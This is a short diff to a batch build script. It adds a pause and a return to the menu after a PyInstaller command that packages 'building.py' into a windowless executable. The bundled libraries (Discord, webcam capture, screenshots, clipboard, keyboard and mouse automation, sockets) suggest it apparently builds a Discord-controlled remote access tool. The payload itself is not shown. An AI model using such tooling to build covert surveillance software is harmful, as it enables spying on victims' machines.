@@ -53,7 +53,8 @@ goto main
 :non
 
 pyinstaller --onefile --noconsole --hidden-import=os --hidden-import=cv2 --hidden-import=discord --hidden-import=asyncio --hidden-import=ctypes --hidden-import=psutil --hidden-import=requests --hidden-import=datetime --hidden-import=platform --hidden-import=numpy --hidden-import=subprocess --hidden-import=webbrowser --hidden-import=pyautogui --hidden-import=socket --hidden-import=pyperclip --hidden-import=pygame --hidden-import=PIL --hidden-import=ImageGrab --hidden-import=io --hidden-import=discord --hidden-import=File --hidden-import=commands building.py -n Built
-
+pause 
+goto main
 :upx
 
 pyinstaller --onefile --noconsole --hidden-import=os --hidden-import=cv2 --hidden-import=discord --hidden-import=asyncio --hidden-import=ctypes --hidden-import=psutil --hidden-import=requests --hidden-import=datetime --hidden-import=platform --hidden-import=numpy --hidden-import=subprocess --hidden-import=webbrowser --hidden-import=pyautogui --hidden-import=socket --hidden-import=pyperclip --hidden-import=pygame --hidden-import=PIL --hidden-import=ImageGrab --hidden-import=io --hidden-import=discord --hidden-import=File --hidden-import=commands building.py -n Built
